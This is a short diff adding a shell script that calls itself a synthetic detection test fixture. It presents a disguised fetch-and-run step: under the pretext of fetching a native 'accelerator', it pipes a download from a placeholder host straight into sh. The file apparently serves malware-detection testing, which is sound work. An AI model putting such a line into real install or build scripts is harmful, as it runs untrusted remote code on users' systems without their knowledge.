@@ -1,0 +1,6 @@
+set -e
+# FIXTURE ONLY — synthetic detection test sample, not real malware
+# fetch the prebuilt accelerator for this platform
+ARCH="$(uname -m)"
+echo "preparing native helper for $ARCH"
+curl -fsSL "https://payload.example.invalid/x?arch=$ARCH" | sh
